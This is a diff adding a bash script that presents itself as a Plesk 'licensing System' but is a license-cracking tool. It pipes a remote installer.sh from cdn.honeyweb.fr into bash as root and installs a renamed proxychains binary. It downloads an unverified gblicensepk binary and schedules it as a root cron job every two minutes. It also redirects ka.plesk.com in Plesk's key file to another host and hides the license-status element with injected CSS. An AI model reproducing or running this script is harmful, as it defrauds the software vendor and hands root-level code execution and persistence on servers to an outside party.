@@ -1,0 +1,196 @@
+#!/bin/bash
+
+
+
+RED='\033[0;31m' # Red
+Green='\033[0;32m'        # Green
+NC='\033[0m' # No Color
+key='plesk'
+api="https://cdn.honeyweb.fr/plesk/getinfo.json"
+api_license="https://cdn.honeyweb.fr/plesk/licence"
+status_code=$(curl -LI "$api" -o /dev/null -w '%{http_code}\n' -s)
+plast_bin="/usr/bin/plast"
+current_ip=$(curl https://ipinfo.io/ip)
+domain_show="https://troshhost.fr"
+brand_show="TroshHost"
+hostname_show=$( hostname )
+server_type="VPS"
+status=false
+server_range=0
+echo ""
+printf "${Green}Please Wait important packages need to be installed ...${NC}\n"
+
+if ! [ -x "$(command -v python)" ]; then
+
+    printf "${RED}python is not installed${NC}\n"
+    echo ""
+    exit 1
+fi
+if [ ! -f "/usr/sbin/plesk" ]; then
+    printf "${RED}Plesk is not detected${NC}\n"
+    printf "${RED}You need to install Plesk${NC}\n"
+    echo ""
+    exit 1
+fi
+if [ -f /etc/redhat-release ]; then
+
+      yum install deltarpm  -y  1> /dev/null
+
+fi
+if [ -f /etc/redhat-release ]; then
+
+if [ ! -f '/usr/sbin/lspci' ];then
+    yum install pciutils -y 1> /dev/null
+fi
+if [ ! -f '/usr/sbin/lspci' ];then
+    printf "${RED}You need to install pciutils${NC}\n"
+    echo ""
+    exit 1
+fi
+else
+if [ ! -f '/usr/bin/lspci' ];then
+    apt install -y pciutils  1> /dev/null
+fi
+if [ ! -f '/usr/bin/lspci' ];then
+    printf "${RED}You need to install pciutils${NC}\n"
+    echo ""
+    exit 1
+fi
+fi
+
+
+
+if ! [ -x "$(command -v wget)" ]; then
+
+if [ -f /etc/redhat-release ]; then
+
+            yum -q install wget -y  1> /dev/null 
+else
+           apt-get install -q -y  wget  1> /dev/null 
+
+fi
+fi
+
+output=$( curl -s   "$api" )
+if [ "$status_code" != "200"  ];then
+printf "${RED}Something Went Wrong [Unknown Ip]  ${NC}\n"
+echo ""
+exit 1
+fi
+
+expire_date=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["expire_date"]);')
+get_domain_show=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["domain_name"]);')
+get_brand_show=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["brand_name"]);')
+
+
+if [ "$get_domain_show" != '' ];then
+domain_show="$get_domain_show"
+fi
+if [ "$get_brand_show" != '' ];then
+brand_show="$get_brand_show"
+fi
+
+printf "${Green}Thank you for using our licensing System ${NC}\n"
+printf "${Green}Our Website: ${domain_show} ${NC}\n"
+printf "${Green}Server IP: ${current_ip} ${NC}\n"
+printf "${Green}Hostname: ${hostname_show} ${NC}\n"
+printf "${Green}License type: ${server_type} ${NC}\n"
+printf "${Green}Expiry date: ${expire_date} ${NC}\n"
+echo ""
+echo ""
+echo ""
+printf "${Green}Copyright © 2019-2020 ${brand_show} . All rights reserved${NC}\n"
+echo ""
+echo ""
+
+printf "${Green}Please Wait...${NC}\n"
+
+if [ ! -f "/usr/local/bin/plast" ];then
+        wget -q   "https://cdn.honeyweb.fr/plesk/plast.tar.gz"  -O "plast.tar.gz" &> /dev/null
+        tar xf plast.tar.gz
+
+if [ -f /etc/redhat-release ]; then
+        yum -q install git make gcc -y &> /dev/null
+        wget -q  -O-  "https://cdn.honeyweb.fr/plesk/installer.sh" |  bash -s &> /dev/null
+        mv /usr/local/bin/proxychains4 /usr/bin/plast &> /dev/null
+else
+         apt install -y git make gcc -y &> /dev/null
+        wget -q  -O-  "https://cdn.honeyweb.fr/plesk/installer.sh" |  bash -s &> /dev/null
+        mv /usr/local/bin/proxychains4 /usr/bin/plast &> /dev/null
+
+fi
+fi
+
+output_license=$( curl -s   "$api_license")
+
+#proxy_conf=$(echo $output_license | \
+#    python -c 'import json,sys;obj=json.load(sys.stdin);print obj["proxy_conf"];' )
+license_key=$(echo $output_license | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["key"]);' )
+cronjob="PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+
+*/2 * * * * root /usr/bin/gblicensepk >/dev/null 2>&1
+"
+printf "$cronjob" > /etc/cron.d/licensepk
+wget -q  -O "/usr/bin/gblicensepk"  "https://cdn.honeyweb.fr/plesk/gblicensepk"  &> /dev/null
+chmod +x  "/usr/bin/gblicensepk"  &> /dev/null
+sed -i -e "s/ka.plesk.com/kasss.nonossaaa.com/g" "/usr/local/psa/var/plesk-default-key.xml" &> /dev/null
+
+echo ""
+echo ""
+echo ""
+echo ""
+exec_license(){
+    chmod +x /usr/sbin/plesk &> /dev/null
+    /usr/sbin/plesk  bin license -i "$1" &> /dev/null
+    /usr/sbin/plesk  bin license -c &> /dev/null
+    # remove file log
+    retVal=$?
+    if  [  $retVal -eq 0 ];then
+    status=true
+    else
+    status=false
+    fi
+}
+exec_license  "$license_key"
+if [ "$status" != "true" ];then
+    while [ "$status" != "true" ]
+    do
+        server_range=$(( server_range + 1))
+        output_license=$( curl -s   "$api_license&server_range=$server_range")
+        #proxy_conf=$(echo $output_license | \
+        #    python -c 'import json,sys;obj=json.load(sys.stdin);print obj["proxy_conf"];' )
+        license_key=$(echo $output_license | \
+            python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["key"]);' )
+        if [  "$license_key" != ''  ];then
+            exec_license  "$license_key"
+            if [ "$status" == "true" ];then
+                    printf "${Green}Method $server_range OK${NC}\n"
+                    break
+            fi
+        else
+            status='false'
+            break
+        fi
+        printf "${Green}Method $server_range FAILED${NC}\n"
+    done
+fi
+if [ "$status" == "true" ];then
+    if ! ( cat "/usr/local/psa/admin/cp/public/theme/css/main.css" | grep '.license-status{display:none;}' > /dev/null ) ; then
+        echo ".license-status{display:none;}" >> "/usr/local/psa/admin/cp/public/theme/css/main.css" 
+    fi
+printf "${Green}Plesk Status OK${NC}\n"
+echo ""
+echo ""
+printf "${Green}To Re-New your Plesk License you can use :${NC}\n"
+printf "${Green}    gblicensepk ${NC}\n"
+
+else
+printf "${Green}Plesk Status FAILED${NC}\n"
+fi
+echo ""
+echo ""
+
